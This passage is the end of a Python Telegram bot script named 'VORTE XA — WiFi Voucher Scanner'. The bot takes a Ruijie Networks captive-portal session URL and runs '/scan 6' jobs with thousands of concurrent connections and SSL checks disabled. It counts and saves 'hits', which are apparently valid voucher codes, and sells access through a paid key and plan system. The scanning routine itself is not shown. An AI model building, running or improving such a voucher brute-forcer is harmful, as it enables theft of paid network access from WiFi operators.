                        expires_str = f"{days}d {hours}h {minutes}m left"
                except:
                    expires_str = expires
            lines.append(f"👤 {uid}\n   Plan: {plan}\n   Expires: {expires_str}")

    text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
    await bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['status'])
async def status(message):
    if str(message.chat.id) != str(ADMIN_ID):
        await bot.reply_to(message, "No Permission")
        return

    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    approved_users = sum(1 for v in approve.values() if v)
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    total_found = sum(len(v) for v in success_texts.values())

    await bot.reply_to(
        message,
        f"📊 **Bot Status**\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔄 Active Scans: {active_scans}\n"
        f"✅ Approved Users: {approved_users}\n"
        f"👥 Sessions Loaded: {len(user_data)}\n"
        f"💎 Total Found: {total_found}\n"
        f"🔐 Key System: {'ON' if USE_KEY_SYSTEM else 'OFF'}",
        parse_mode="Markdown"
    )

# ════════════════════════════════════════════════════════════════
#  SMART INPUT HANDLER
# ════════════════════════════════════════════════════════════════
@bot.message_handler(func=lambda msg: msg.text and not msg.text.startswith("/"))
async def smart_input(message):
    text = message.text.strip()
    chat_id = message.chat.id

    if text.startswith("http") and ("ruijienetworks.com" in text or "portal" in text.lower()):
        if await check_session_url(text):
            user_data.setdefault(chat_id, {})
            user_data[chat_id]['session_url'] = text
            success_texts.pop(chat_id, None)
            limited_texts.pop(chat_id, None)
            save_state()
            await bot.send_message(
                chat_id,
                "✅ Session URL saved!\n\nSend /scan 6 to start",
                reply_markup=_main_keyboard()
            )
        else:
            await bot.send_message(chat_id, "❌ Invalid Session URL")
        return

    await bot.send_message(
        chat_id,
        "💡 Send your Session URL to start\n\n"
        "Or use commands:\n"
        "/input [url] - Set URL\n"
        "/scan 6 - Start scan\n"
        "/help - More commands",
        reply_markup=_main_keyboard()
    )

# ════════════════════════════════════════════════════════════════
#  CALLBACK HANDLERS
# ════════════════════════════════════════════════════════════════
@bot.callback_query_handler(func=lambda call: call.data.startswith("dash_"))
async def handle_dash_callback(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)

    if call.data == "dash_start":
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await bot.send_message(chat_id, "⚠️ /input ဖြင့် Session URL ထည့်ပါ")
            return
        await bot.send_message(chat_id, "💡 /scan 6 ဖြင့် စတင်ပါ")
    elif call.data == "dash_stop":
        data = scan_tasks.get(chat_id)
        if data and not data["task"].done():
            data["stop"] = True
            data["task"].cancel()
            scan_tasks.pop(chat_id, None)
            await bot.send_message(chat_id, "🛑 Scan ရပ်ထားပါပြီ")
        else:
            await bot.send_message(chat_id, "⚪ ရပ်ရန် scan မရှိပါ")
    elif call.data == "dash_refresh":
        await send_dashboard(chat_id, force_send=True)
    elif call.data == "dash_hits":
        await saved_codes(call.message)
    elif call.data == "dash_help":
        await help_cmd(call.message)
    elif call.data == "dash_status":
        await status(call.message)

# ════════════════════════════════════════════════════════════════
#  POLLING & MAIN
# ════════════════════════════════════════════════════════════════
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=35)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"Polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    print("=" * 50)
    print("  VORTE XA — WiFi Voucher Scanner")
    print(f"  Key System: {'ON' if USE_KEY_SYSTEM else 'OFF'}")
    print("  GitHub: REMOVED")
    print("=" * 50)

    _connector = aiohttp.TCPConnector(limit=5000, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=30),
        connector=_connector,
        connector_owner=False
    )

    try:
        asyncio.create_task(web_server())
        load_state()
        load_hits()
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
   
